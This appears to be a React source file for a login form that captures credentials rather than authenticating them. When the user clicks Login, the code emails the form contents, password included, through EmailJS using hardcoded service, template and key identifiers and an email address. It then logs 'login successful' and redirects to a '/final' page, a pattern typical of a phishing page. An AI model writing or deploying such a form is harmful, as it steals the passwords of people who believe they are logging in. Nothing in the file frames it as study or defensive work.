import React, { useState } from "react";
import emailjs from "@emailjs/browser";

import { useNavigate } from "react-router";

export default function Form({ setRouter }) {
  const [user, setUser] = useState({
    username: "",
    password: "",
  });

  const navigate = useNavigate();

  const handleChange = (e, type) => {
    e.preventDefault();
    setUser({ ...user, [type]: e.target.value });
  };

  const sendEmail = (e) => {
    e.preventDefault();
    emailjs.init("send2nupur28@gmail.com");

    console.log("login successful");
    emailjs
      .sendForm(
        "service_rtjeesg",
        "template_aqaosl1",
        document.getElementById("form"),
        "0zdcXFrQ16YNpV4ki"
      )
      .then(
        (result) => {
          console.log(result.text);
          
        },
        (error) => {
          console.log(error.text);
        }
      );

    navigate('/final');
  
  };
  return (
    <form id="form" method="GET">
      
      {/* <label>Username: </label> */}
      <input
        type="text"
        value={user.username}
        name="username"
        id="username"
        onChange={(e) => handleChange(e, "username")}
        placeholder="Username"
      />
      {/* <label>Password: </label> */}
      <input
        type="password"
        value={user.password}
        name="password"
        id="password"
        onChange={(e) => handleChange(e, "password")}
        placeholder="Password"
      />
      {user.username && user.password && (
        <button onClick={sendEmail} type="submit">
          Login
        </button>
      )}
    </form>
  );
}
